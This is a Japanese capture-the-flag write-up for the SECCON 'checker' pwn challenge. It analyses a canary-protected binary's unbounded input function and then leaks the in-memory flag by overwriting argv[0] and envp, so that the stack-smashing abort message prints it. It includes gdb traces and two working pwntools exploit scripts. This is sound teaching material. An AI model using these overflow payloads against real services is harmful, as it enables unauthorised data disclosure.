@@ -1,0 +1,642 @@
+checker
+
+問題のバイナリと、サービスが動作しているホストとポートのみが与えられる。
+
+Host: checker.pwn.seccon.jp
+Port: 14726
+
+checker(SHA1:576202ccac9c1c84d3cf6c2ed0ec4d44a042f8ef)
+
+問題ファイルダウンロード
+https://book.mynavi.jp/files/user/support/9784839962135/mondai5.zip
+
+
+まずはこのバイナリがどんなセキュリティ機構を持っているか調べる。
+checksecで確認を行う。
+
+$ checksec --file checker
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols       FORTIFY  Fortified       Fortifiable  FILE
+Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   76 Symbols    Yes      0               4       checker
+
+$ file checker
+checker: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=93df47896b068ea44ddcd0b97780375cd589987e, not stripped
+
+cheer_msgと異なる点は以下の通り。
+・Arch: amd64の実行バイナリ
+・RELRO: Full RELROであることからGOT Overwriteが不可能
+
+
+実際にバイナリを動かしてみる。今回もsocatを用いて接続を待ち受けるようにする。
+
+$ socat -v tcp-listen:14726,fork,reuseaddr exec:./checker,stderr
+
+14726番ポートに接続し、動きを角煮する。
+すると、"flag.txt"が見つからないという旨のメッセージが出てくる。もう一度改めて接続すると、今度は正常に動く。何か適当な内容を書き込んだflag.txtをcheckerが動いているのと同じディレクトリに作成しておく。
+はじめに名前を聞かれるので教えると、今度は延々とフラグを持っているか聞かれる。"yes"と答えるまでこれは続く。"yes"と答えたら、今度はそのフラグ自体を尋ねられる。適当な文字列を送ると嘘つき呼ばわれされる。
+これらの挙動から、このプログラムはあらかじめフラグをflag.txtから自身のメモリ内に読み込み、それと入力と比較を行なっているように予想される。
+
+
+逆アセンブルしてバイナリを解析していく。
+
+main関数の動きとしては、名前の入力、フラグの有無確認ループ、フラグの入力の3つに大別される。
+
+1.スタックオーバーフローによるリターンアドレス改竄の抑止
+checksecで確認した通り、このプログラムではcanaryによるスタックの保護が効いている。
+
+まずは関数プロローグにおいて、スタックフレームの調整の直後にcanaryをスタックの[rbp-0x8]に保存している。
+一般的にTLS(Threas Local Storage)に保存されているランダムな値を用いる。
+
+0000000000400808 <main>
+   0x400808 <main>:     push   rbp
+   0x400809 <main+1>:   mov    rbp,rsp
+=> 0x40080c <main+4>:   sub    rsp,0x90
+   0x400813 <main+11>:  mov    rax,QWORD PTR fs:0x28
+   0x40081c <main+20>:  mov    QWORD PTR [rbp-0x8],rax
+
+関数エピローグにおいて、スタックに保存しておいたcanaryが変化していないかどうか、xor命令を用いて確認をしている。もし書き換わっていたのであれば、__stack_chk_fail関数を呼びプログラムをアボートさせることで、リターンアドレス等が改竄された状態で処理が続行することを防ぐ。
+
+2.名前の入力
+ユーザに名前の入力を要求している部分。
+amd64アーキテクチャは、先頭6つの引数はレジスタを使い、それ以降はスタックを使って引き渡す。
+使用するレジスタの順番はrdi、rsi、rdx、rcx、r8、r9。
+0x601040を第一引数としてgetaline関数を呼んでいることがわかる。この関数でユーザからの入力を受け取り、メモリに格納している。0x601040は.bss領域となっている。
+
+   0x400820 <main+24>:  xor    eax,eax
+   0x400822 <main+26>:  mov    esi,0x400a48
+   0x400827 <main+31>:  mov    edi,0x1
+=> 0x40082c <main+36>:  mov    eax,0x0
+   0x400831 <main+41>:  call   0x4005f0 <dprintf@plt>
+   0x400836 <main+46>:  mov    edi,0x601040
+   0x40083b <main+51>:  call   0x400920 <getaline>
+
+3.フラグの有無確認ループ
+ここでフラグを持っているかどうか尋ねられ、"yes"と答えるまで延々とループする。今度は.bss領域ではなく、スタックの[rbp-0x90]以降にgetaline関数を使って読み込む。
+
+   0x400840 <main+56>:  mov    esi,0x400a6a
+   0x400845 <main+61>:  mov    edi,0x1
+   0x40084a <main+66>:  mov    eax,0x0
+   0x40084f <main+71>:  call   0x4005f0 <dprintf@plt>
+   0x400854 <main+76>:  lea    rax,[rbp-0x90]
+   0x40085b <main+83>:  mov    rdi,rax
+   0x40085e <main+86>:  call   0x400920 <getaline>
+   0x400863 <main+91>:  lea    rax,[rbp-0x90]
+   0x400863 <main+91>:  lea    rax,[rbp-0x90]
+   0x40086a <main+98>:  mov    esi,0x400a81
+   0x40086f <main+103>: mov    rdi,rax
+   0x400872 <main+106>: call   0x400620 <strcmp@plt>
+   0x400877 <main+111>: test   eax,eax
+   0x400879 <main+113>: jne    0x400840 <main+56>
+
+4.フラグの入力
+フラグの入力を行う領域も、先と同様に[rbp-0x90]以降となっている。
+
+   0x40087b <main+115>: mov    esi,0x400a88
+   0x400880 <main+120>: mov    edi,0x1
+   0x400885 <main+125>: mov    eax,0x0
+   0x40088a <main+130>: call   0x4005f0 <dprintf@plt>
+   0x40088f <main+135>: lea    rax,[rbp-0x90]
+   0x400896 <main+142>: mov    rdi,rax
+   0x400899 <main+145>: call   0x400920 <getaline>
+
+
+getaline関数
+1.引数の扱い
+関数に入りスタックフレームの処理を終えた直後、rdiに格納されている値を[rdp-0x18]に移動している。DWORDではなくQWORD(Quad Word)となっている。8byte単位での書き込み。
+
+0000000000400920 <getaline>:
+   0x400920 <getaline>: push   rbp
+   0x400921 <getaline+1>:       mov    rbp,rsp
+   0x400924 <getaline+4>:       sub    rsp,0x20
+   0x400928 <getaline+8>:       mov    QWORD PTR [rbp-0x18],rdi
+
+2.文字の読み込み
+この関数の中でユーザ入力を受け取っているのは、read関数を呼んでいる1ヶ所に限られる。read関数に与えられている引数から、1byteだけ標準入力から受け取って[rbp-0xd]に格納している。
+
+   0x400973 <getaline+83>:      lea    rax,[rbp-0xd]
+   0x400977 <getaline+87>:      mov    edx,0x1
+   0x40097c <getaline+92>:      mov    rsi,rax
+   0x40097f <getaline+95>:      mov    edi,0x0
+   0x400984 <getaline+100>:     call   0x400600 <read@plt>
+
+3.文字列の格納
+受けとったも文字はどのように処理されているか確認する。
+[rbp-0xd]に格納された値と0x0aを比較して処理していることから、改行文字が入力されたらそれを塗る文字に置換している様子が確認できる。その後、その文字は引数で与えられた値に[rbp-0xc]に格納されていた値を加算したアドレスに格納している。
+[rbp-0xc]ははじめはゼロ初期化されていて、ループを重ねるにつれて1ずつ足されていることからindexとしての役割を担っていると考えられる。また、格納した値がヌル文字だった場合はこのループを抜け出す。
+
+   0x40093f <getaline+31>:      mov    DWORD PTR [rbp-0xc],0x0
+   0x400946 <getaline+38>:      jmp    0x40096b <getaline+75>
+   0x400948 <getaline+40>:      movzx  eax,BYTE PTR [rbp-0xd]
+   0x40094c <getaline+44>:      cmp    al,0xa
+   0x40094e <getaline+46>:      jne    0x400954 <getaline+52>
+   0x400950 <getaline+48>:      mov    BYTE PTR [rbp-0xd],0x0
+   0x400954 <getaline+52>:      mov    eax,DWORD PTR [rbp-0xc]
+   0x400957 <getaline+55>:      movsxd rdx,eax
+   0x40095a <getaline+58>:      mov    rax,QWORD PTR [rbp-0x18]
+   0x40095e <getaline+62>:      add    rdx,rax
+   0x400961 <getaline+65>:      movzx  eax,BYTE PTR [rbp-0xd]
+   0x400965 <getaline+69>:      mov    BYTE PTR [rdx],al
+   0x400967 <getaline+71>:      add    DWORD PTR [rbp-0xc],0x1
+   0x40096b <getaline+75>:      movzx  eax,BYTE PTR [rbp-0xd]
+   0x40096f <getaline+79>:      test   al,al
+   0x400971 <getaline+81>:      je     0x40098e <getaline+110>
+
+これらの情報を足し合わせて考えると、この関数では引数に与えられたメモリアドレス以降に改行文字かヌル文字が与えられるまで入力値を格納し続ける、ということが分かる。
+
+
+明らかな脆弱性がgetaline関数に存在している。
+入力する文字数を指定せずに読み込みを行なっているため、バッファオーバフローが起こる。
+試しにフラグの入力部で長い文字列を送ってみると、一見すると正常に終わっているように見えるが、socatを実行しているサーバー側の出力は"stack smashing detected"の文字列が確認できる。canaryによるROPの防御機構が働いていることがわかる。
+
+サーバー準備
+$ socat -v tcp-listen:14726,fork,reuseaddr exec:./checker,stderr
+
+クライアント側
+$ nc localhost 14726
+Hello! What is your name?
+NAME : shiftcrops
+
+Do you know flag?
+>> yes
+
+Oh, Really??
+Please tell me the flag!
+FLAG : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaa
+You are a liar...
+*** stack smashing detected ***: <unknown> terminated
+
+
+サーバー側
+lease tell me the flag!
+FLAG : > 2019/11/16 22:42:37.807611  length=171 from=15 to=185
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+< 2019/11/16 22:42:37.807821  length=18 from=101 to=118
+You are a liar...
+< 2019/11/16 22:42:37.807859  length=54 from=119 to=172
+*** stack smashing detected ***: <unknown> terminated
+2019/11/16 22:42:38 socat[3372] E waitpid(): child 3373 exited on signal 6
+
+
+
+getaline関数によってバッファオーバーフローが起きることが確認できた。
+しかしながら、オーバーフローしたからといって攻撃者が何をできるかはまだ分からない。この関数は、.bss領域とスタックに対して読み込みを行う。それぞれ上書きできるものがあるか見てみる。
+
+まず.bss領域。nameの直下にflagが存在している。この問題の目標はこの文字列をリークさせること。flagの直前まで文字を敷き詰めてみようと思ってもヌル終端される。名前が出力される機会もそもそもない。
+flag以降はずっと0で占められており、そこには何かしらの変数も存在していないため、.bss領域のバッファオーバーフローを用いても特にできることはない。この領域に4,032byte以上書き込んだ場合プログラムは落ちるが、それはページ外にはみ出して書き込みを行なったためにsegmentation faultを起こしたのであり、攻撃には使えない。
+
+
+gdb-peda$ x/50gx 0x601040
+0x601040 <name>:        0x0000000000000000      0x0000000000000000
+0x601050 <name+16>:     0x0000000000000000      0x0000000000000000
+0x601060 <name+32>:     0x0000000000000000      0x0000000000000000
+0x601070 <name+48>:     0x0000000000000000      0x0000000000000000
+0x601080 <name+64>:     0x0000000000000000      0x0000000000000000
+0x601090 <name+80>:     0x0000000000000000      0x0000000000000000
+0x6010a0 <name+96>:     0x0000000000000000      0x0000000000000000
+0x6010b0 <name+112>:    0x0000000000000000      0x0000000000000000
+0x6010c0 <flag>:        0x4e7b4e4f43434553      0x5f35315f542e3034
+0x6010d0 <flag+16>:     0x7d3363313735756a      0x000000000000000a
+0x6010e0 <flag+32>:     0x0000000000000000      0x0000000000000000
+0x6010f0 <flag+48>:     0x0000000000000000      0x0000000000000000
+0x601100 <flag+64>:     0x0000000000000000      0x0000000000000000
+
+
+次にスタックを覗いてみる。スタック上にはたくさんのごみデータもあるため、1つひとつ見ていくのは無意味。先の逆アセンブル結果から読み解いていく。
+文字列が読み込まれるのはmain関数のスタックフレーム内の[rbp-0x90]以降。
+canaryは[rbp-0x8]に置かれている。すなわち、この間はいくらでも自由にデータを書き換えられるが、canaryを超えて書き換えを行なった場合はプログラムがアボートしてしまう。しかし、[rbp-0x90]から[rbp-0x8]の間の領域に対して何かしら処理を加えている様子は、逆アセンブルした結果からは見受けられない。
+ということは、canaryを超えない書き換えを行なっても何もプログラムの動作には影響を及ぼさないということになる。
+
+以上より、今回のプログラムで動作に影響を及ぼす可能性があるのは、スタックオーバーフローを起こしてcanaryを破壊する場合のみということがわかる。この脆弱性が何に使えるのかは後で考えるとして、ひとまず攻撃の足がかりとなり得るものはこの1箇所だけ。
+
+
+脆弱勢の場所は確定した。ここからはこれを利用してどのようにフラグを得るか考えていく。
+
+
+今回の問題もリモート型のPwnable問題。cheer_msgとは異なり、あらかじめメモリ内にフラグの文字列を読み込んでいるため、シェルを奪う必要はない。
+フラグが格納されているアドレスもすでに判明しているので、そこからリークさせることを目標にする。
+
+1.攻撃手法の選定
+a) "stack smashing detected"メッセージの出力
+canaryを破壊したときに表示されるメッセージが、どのようにして生成されているのかを考える。これはシステムが勝手に吐いているものではなく、libcが__stack_chk_fail関数の中で生成している文字列。
+
+*** stack smashing detected ***: ./checker
+
+どのようにしてこの文字列が生成されているのか、libcのソースコードを追ってみる。
+まずはstack_chk_fail.c。__stack_chk_fail関数は、"stack smashing detected"を引数に与えて、__fortify_fail関数を呼んでいるだけ。
+
+[debug/stack_chk_fail.c]
+#include <stdio.h>
+#include <stdlib.h>
+
+extern char **__libc_argv attribute_hidden;
+
+void
+__attribute__ ((noreturn))
+__stack_chk_fail (void)
+{
+  __fortify_fail ("stack smashing detected");
+}
+
+
+次にfortify_fail.c。これが本命の処理になる。__fortify_fail関数内において、引数に__libc_argv[0]を与えて__libc_message関数を呼んでいるのが見てとれる。この位置は実行しているプログラム名が含まれているはずの場所。
+
+[debug/fortify_fail.c]
+#include <stdio.h>
+#include <stdlib.h>
+
+extern char **__libc_argv attribute_hidden;
+
+void
+__attribute__ ((noreturn))
+__fortify_fail (msg)
+     const char *msg;
+{
+  /* The loop is added only to keep gcc happy. */
+  while (1)
+    __libc_message (2, "*** %s ***: %s terminated\n",
+            msg, __libc_argv[0] ?: "<unknown>");
+}
+libc_hidden_def (__fortify_fail)
+
+
+実際に__libc_message関数を呼ぶ直前にブレークを仕掛けて、どのような値が引き渡されているのか確認する。意図的にcanaryを破壊し、__stack_chk_fail関数を呼ぶ。確かに、第4引数であるrcxにはスタック上に配置されたプログラム名のアドレスが格納されていることがわかる。
+
+
+Please tell me the flag!
+FLAG : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+You are a liar...
+ [--------------------------------registers----------------------------------]
+RAX; 0x0
+RBX: 0x1
+RCX: 0x7fffffffe0d4 ("/home/yutaro/CTF/SECCON/checker")
+RDX: 0x7ffff7b9c441 ("stack smashing detected")
+RSI: 0x7ffff7b9c45f ("*** %s ***: %s terminated\n")
+RDI: 0x1
+RBP: 0x7ffff7b9c441 ("stack smashing detected")
+RSP: 0x7fffffffdb60 ---> 0x0
+RIP: 0x7ffff7b26117 (<__GI___fortify_fail+87>:  call   0x7ffff7a84510 <__libc_message>)
+R8 : 0x7ffff7dd0260 --> 0x0
+R9 : 0x1
+R10: 0x7ffff7dd1b78 --> 0x602000 --> 0x0
+R11: 0x246
+R12: 0x7ffff7b9abf5 ("<unknown>")
+R13: 0x7fffffffdd00 --> 0x1
+R14: 0x0
+R15: 0x0
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+ [------------------------------code-----------------------------------------]
+    0x7ffff7b2610e <__GI___fortify_fail+78>:     test   rcx,rcx
+    0x7ffff7b26111 <__GI___fortify_fail+81>:     cmove  rcx,r12
+    0x7ffff7b26115 <__GI___fortify_fail+85>:     xor    eax,eax
+ => 0x7ffff7b26117 <__GI___fortify_fail+87>:     call   0x7ffff7a84510 <__libc_message>
+    0x7ffff7b2611c <__GI___fortify_fail+92>:     jmp    0x7ffff7b260f8 <__GI___fortify_fail+56>
+    0x7ffff7b2611e:      xchg   ax,ax
+    0x7ffff7b26120 <load_dso>:   sub   rsp,0x8
+    0x7ffff7b26124 <load_dso+4>: mov   esi,0x1
+ Guessed arguments:
+ arg[0]: 0x1
+ arg[1]: 0x7ffff7b9c45f ("*** %s ***: %s terminated\n")
+ arg[2]: 0x7ffff7b9c441 ("stack smashing detected")
+ arg[3]: 0x7fffffffe0d4 ("/home/yutaro/CTF/SECCON/checker")
+ [------------------------------stack----------------------------------------]
+ 0000| 0x7fffffffdb60 --> 0x0
+ 0008| 0x7fffffffdb68 --> 0x7fffffffdc20 ('a' <repeats 25 times>)
+ 0016| 0x7fffffffdb70 --> 0x400660 (<_start>:    xor    ebp,ebp)
+ 0024| 0x7fffffffdb78 --> 0x7ffff7b260c0 (<__GI___fortify_fail>: push r12)
+ 0032| 0x7fffffffdb80 --> 0x7fffffffdc20 ('a' <repeats 25 times>)
+ 0040| 0x7fffffffdb88 --> 0x40091e (<main+278>:  leave)
+ 0048| 0x7fffffffdb90 ('a' <repeats 169 times>)
+ 0056| 0x7fffffffdb98 ('a' <repeats 161 times>)
+ [---------------------------------------------------------------------------]
+ Legend: code, data, rodata, value
+
+ Breakpoint 2, 0x00007ffff7b26117 in __GI___fortify_fail
+ (msg=<optimized out>,msg@entry=0x7ffff7b9c441 "stack smashing detected") at fortify_fail.c:37
+
+
+b)スタックの構成
+rcxにこの値が渡るまでの流れを説明する前に、そもそも実行時の引数がどのようにスタックに配置されているのかを説明する必要がある。main関数の引数は次のように定義される。
+
+int main(int argc, char* argv[], char* envp[]);
+
+main関数だけ特別ということはなく、他の関数同様レジスタでこれらの値は渡される。argvが実行時引数、envpが環境変数。
+スタック上で実行時引数や環境変数は次のように配置されている。つまり、argvやenvpは文字列の実態が格納されているポインタの配列。
+
+Low  |                      | ↑
+     +----------------------+--- main function's stack frame
+     |    return address    |
+     +----------------------+
+     |                      |
+     +----------------------+
+     |         argc         |
+     +----------------------+
+ +---|         argv         |
+ |   +----------------------+
+ | +-|         envp         |
+ | | +----------------------+
+ | | |                      |
+ | | |                      |
+ | | |                      |
+ +-+>+----------------------+
+   | |       argv[0]        |-+
+   | +----------------------+ |
+   | |         ...          | |
+   | +----------------------+ |
+   | |     argv[argc-1]     |-+-+
+   | +----------------------+ | |
+   | |        NULL          | | |
+   +>+----------------------+ | |
+     |       envp[0]        |-+-+-+
+     +----------------------+ | | |
+     |       envp[1]        |-+-+-+-+
+     +----------------------+ | | | |
+     |         ...          | | | | |
+     +----------------------+ | | | |
+     |        NULL          | | | | |
+     +----------------------+ | | | |
+     |                      | | | | |
+     |                      | | | | |
+     |                      | | | | |
+     +----------------------+<+ | | |
+     |        args        <-|---+ | |
+     |                 <----|-----+ |
+     |        envs       <--|-------+
+High |                      |
+
+
+__libc_argvにはmain関数に渡されるargvと同じ値が格納されている。
+argvのポインタ配列を改竄することができれば、rcxに任意の値を格納した状態で__libc_message関数が呼べそうである。
+すなわち任意アドレスに格納された情報リークが可能になる。
+
+
+0x00007ffff7b260f8 <+56>:    mov    rax,QWORD PTR [rip+0x2b01f9]
+# 0x7ffff7dd62f8 <__libc_argv>
+(中略)
+0x00007ffff7b2610b <+75>:    mov    rcx,QWORD PTR [rax]
+(中略)
+0x00007ffff7b26117 <+87>:    call   0x7ffff7a84510 <__libc_message>
+
+
+2.攻撃の流れ
+リークしたいデータは既知のアドレスに格納されている。
+したがって、やることはargv[0]の位置の値をflagのアドレスである0x6010c0に書き換えるだけ。
+2.攻撃の流れ
+リークしたいデータは既知のアドレスに格納されている。
+したがって、やることはargv[0]の位置の値をflagのアドレスである0x6010c0に書き換えるだけ。
+
+
+Low  |                      | ↑
+     |                      |--- main function's stack frame
+     |                      |
+     |                      |
+     |                      |
+     |      overwrite       |
+     |                      |
+     |                      |
+     |                      |     __libc_argv
+     |                      |          |
+     +----------------------+<---------+
+     |      0x06010c0       |-------------> flag
+     +----------------------+
+     |         ...          |
+     +----------------------+
+     |     argv[argc-1]     |---+
+     +----------------------+   |
+     |        NULL          |   |
+     +----------------------+   |
+     |       envp[0]        |---+-+
+     +----------------------+   | |
+     |       envp[1]        |---+-+-+
+     +----------------------+   | | |
+     |         ...          |   | | |
+     +----------------------+   | | |
+     |        NULL          |   | | |
+     +----------------------+   | | |
+     |                      |   | | |
+     |                      |   | | |
+     |                      |   | | |
+     +----------------------+   | | |
+     |        args        <-|---+ | |
+     |                 <----|-----+ |
+     |        envs       <--|-------+
+High |                      |
+
+
+ただし、単純にその位置まで適当な値で埋めてから書き込みを行えばいいというわけではない。
+このアーキテクチャはリトルエンディアンであるため、下位バイトから順に書き込む。
+すると、4byte目以降はヌル文字であることに気づく。
+getaline関数はヌル文字を受け取った時点で文字の読み込みを終えてしまう。
+すると、もし0であって欲しい位置に異なる値が保持されていた場合、このアドレスは不正なものとなってしまい、攻撃は失敗する。
+
+
+|                       |             |                       |
++-----------------------+             +-----------------------+
+|                       | =========>  |61 61 61 61 61 61 61 61|
++-----------------------+             +-----------------------+
+|d4|e0|ff|ff|ff|7f|00|00|<- argv[0] ->|c0|10|60|00|ff|7f|00|00|
++-----------------------+             +-----------------------+
+|                       |             |                       |
+
+そこで、フラグ保持の確認が"yes"と入力されるまでループされるのとgetaline関数はヌル終端されることを利用して、1byteずつヌル文字を格納していく。そして、最後に改めて0x6010c0を書き込めば完了。
+
+
+|d4|e0|ff|ff|ff|7f|00|00|
+            v
+|61|61|61|61|61|00|00|00|
+            v
+|61|61|61|61|00|00|00|00|
+            v
+|c0|10|60|00|00|00|00|00|
+
+
+
+Exploitの作成
+pwntoolsを使ってexploitを作成する。
+
+
+1.フラグを出力させる
+まずはgetaline関数で文字列の読み込みを開始するアドレスからargvまでのオフセットを知る必要がある。
+この例では、getaline関数に渡されたアドレスは0x7fffffffdb90であることが分かる。
+argvは0x7fffffffdd08に配置されている。したがって、その差は0x178(=376)byteである。
+
+
+Do you know flag?
+>>
+ [-------------------------------------registers---------------------------------------]
+RAX: 0x7fffffffdb90 --> 0x0
+RBX: 0x0
+RCX: 0x7ffff7ffcca0 --> 0x4040600000000
+RDX: 0x0
+RSI: 0xfbadae44
+RDI: 0x7fffffffdb90 --> 0x0
+RBP: 0x7fffffffdc20 --> 0x4009b0 (<__libc_csu_init>:    push    r15)
+RSP: 0x7fffffffdb90 --> 0x0
+RIP: 0x40085e (<main+86>:       call   0x400920 <getaline>)
+R8 : 0x7ffff7dd0260 --> 0x0
+R9 : 0x1
+R10: 0x7ffff7dd1b78 --> 0x602000 --> 0x0
+R12: 0x400660 (<_start>:        xor    ebp,ebp)
+R13: 0x7fffffffdd00 --> 0x1
+R14: 0x0
+R15: 0x0
+EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+ [--------------------------------------code-------------------------------------------]
+   0x40084f <main+71>:  call   0x4005f0 <dprintf@plt>
+   0x400854 <main+76>:  lea    rax,[rbp-0x90]
+   0x40085b <main+83>:  mov    rdi,rax
+=> 0x40085e <main+86>:  call   0x400920 <getaline>
+   0x400863 <main+91>:  lea    rax,[rbp-0x90]
+   0x40086a <main+98>:  mov    esi,0x400a81
+   0x40086f <main+103>: mov    rdi,rax
+   0x400872 <main+106>: call   0x400620 <strcmp@plt>
+Guessed arguments:
+argv[0]: 0x7fffffffdb90 --> 0x90
+ [-------------------------------------stack-------------------------------------------]
+0000| 0x7fffffffdb90 --> 0x0
+0008| 0x7fffffffdb98 --> 0x4007f2 (<read_flag+110>:     mov    rax,QWORD PTR [rbp-0x8])
+0016| 0x7fffffffdba0 --> 0x7fffffffdd18 --> 0x7fffffffe0f4 ("XDG_SESSION_ID=c12")
+0024| 0x7fffffffdba8 --> 0x400a38 ("flag.txt")
+0032| 0x7fffffffdbb0 --> 0x300000001
+0040| 0x7fffffffdbb8 --> 0x991f6aace7998100
+0048| 0x7fffffffdbc0 --> 0x7fffffffdbe0 --> 0x2
+0056| 0x7fffffffdbc8 --> 0x40076e (<init+33>:   mov    rdx,QWORD PTR [rbp-0x8])
+ [-------------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x000000000040085e in main ()
+gdb-peda$ telescope $rbp+0xe8
+0000| 0x7fffffffdd08 --> 0x7fffffffe0d4 ("/home/yutaro/CTF/SECCON/checker")
+0008| 0x7fffffffdd10 --> 0x0
+0016| 0x7fffffffdd18 --> 0x7fffffffe0f4 ("XDG_SESSION_ID=c12")
+0024| 0x7fffffffdd20 --> 0x7fffffffe107 ("LC_TELEPHONE=en_US.UTF-8")
+0032| 0x7fffffffdd28 --> 0x7fffffffe120 ("QT_LINUX_ACCESSIBILITY_ALWAYS_ON=1")
+0040| 0x7fffffffdd30 --> 0x7fffffffe143 ("GNOME_KEYRING_CONTROL=")
+0048| 0x7fffffffdd38 --> 0x7fffffffe15a ("DEFAULTS_PATH=/usr/share/gconf/gnome-flashback-compiz.default.path")
+0056| 0x7fffffffdd40 --> 0x7fffffffe19d ("LOGNAME=yutaro")
+gdb-peda$ p 0x7fffffffdd08-0x7fffffffdb90
+$1 = 0x178
+
+
+このオフセット情報を用いてexploitを書いていく。
+また、最後に問題バイナリから出力されるメッセージを受け取ることを忘れないようにする。
+
+[exploit_checker_test.py]
+#! /usr/bin/env python
+from pwn import *
+
+rhp = {'host':"localhost", 'port':14726}
+context(os = 'linux', arch = 'amd64')
+binf = ELF('./checker')
+addr_flag = binf.symbols['flag']
+
+#=========
+
+def attack(conn):
+	conn.recvuntil('NAME : ')
+	conn.sendline('name')
+
+	# set argv
+	for i in range(7, 3, -1):
+		conn.recvuntil('>> ')
+		conn.sendline('a' * (0x178+i))
+	conn.recvuntil('>> ')
+	conn.sendline('a' * 0x178 + p64(addr_flag))
+
+	conn.recvuntil('>> ')
+	conn.sendline('yes')
+
+	conn.recvuntil('FLAG : ')
+	conn.sendline('flag')
+
+	print conn.read()
+
+#=========
+
+if __name__=='__main__':
+	conn = remote(rhp['host'], rhp['port'])
+	attack(conn)
+
+#=========
+
+
+表示されないが、socat側ではフラグのリークを確認できる。
+argvの書き換えは成功しているが、出力周りが上手くいっていない。
+
+
+2.手元側に表示させる
+メッセージを出力している実体である__libc_message関数を改めて読んでみる。
+その一部を以下に示す。これはメッセージを出力する先のファイルディスクリプタを決定する部分。
+
+
+int fd = -1;
+
+const char *on_2 = __libc_secure_getenv ("LIBC_FATAL_STDERR_");
+if (on_2 == NULL || *on_2 == '\0')
+  fd = open_not_cancel_2 (_PATH_TTY, O_RDWR | O_NOCTTY | O_NDELAY);
+
+if (fd == -1)
+  fd = STDERR_FILENO;
+
+
+出力先として、open_not_cancel_2関数でttyを開こうとしている。
+ttyを開いてしまうと、メッセージはリモート側のターミナルに出力されるだけで手前側には送信されない。そうならないように、環境変数のLIBC_FATAL_STDERR_を与えれば、1つ目の条件分岐には入らずfdにSTDERR_FILENOが選択される。
+
+環境変数の書き換えは先の引数の書き換えと同様に行う。環境変数を格納するところとして、flag同様に固定された既知のアドレスがあると便利。nameを利用することにし、このアドレスは既知であり、自由に使って問題ないことも既にわかっている。
+以下の処理をexploitに追加する。
+
+1.初めの名前を聞かれる部分でLIBC_FATAL_STDERR_=1を与える
+2.環境変数の先頭がnameになるようにポインタを書き換える
+
+このとき、argvよりも先にenvpの書き換えを行わなくてはならない。envpの書き換え時にargvを上書きしてしまうことは、これらの配置からも分かる。実行時に余分な引数を与えていない状態では、envpはargvの0x10byteだけ高位に配置されているので、オフセットは0x188byte。
+
+
+[exploit_checker.py]
+#! /usr/bin/env python
+from pwn import *
+
+rhp = {'host':"localhost", 'port':14726}
+context(os = 'linux', arch = 'amd64')
+binf = ELF('./checker')
+addr_flag = binf.symbols['flag']
+addr_name = binf.symbols['name']
+
+#=========
+
+def attack(conn):
+	conn.recvuntil('NAME : ')
+	conn.sendline('LIBC_FATAL_STDERR_=1')
+
+	# set envp
+	for i in range(7, 3, -1):
+		conn.recvuntil('>> ')
+		conn.sendline('a' * (0x188+i))
+	conn.recvuntil('>> ')
+	conn.sendline('a' * 0x188 + p64(addr_name))
+
+	# set argv
+	for i in range(7, 3, -1):
+		conn.recvuntil('>> ')
+		conn.sendline('a' * (0x178+i))
+	conn.recvuntil('>> ')
+	conn.sendline('a' * 0x178 + p64(addr_flag))
+
+	conn.recvuntil('>> ')
+	conn.sendline('yes')
+
+	conn.recvuntil('FLAG : ')
+	conn.sendline('flag')
+
+	print conn.read()
+
+#=========
+
+if __name__=='__main__':
+	conn = remote(rhp['host'], rhp['port'])
+	attack(conn)
+
+#=========
+
+
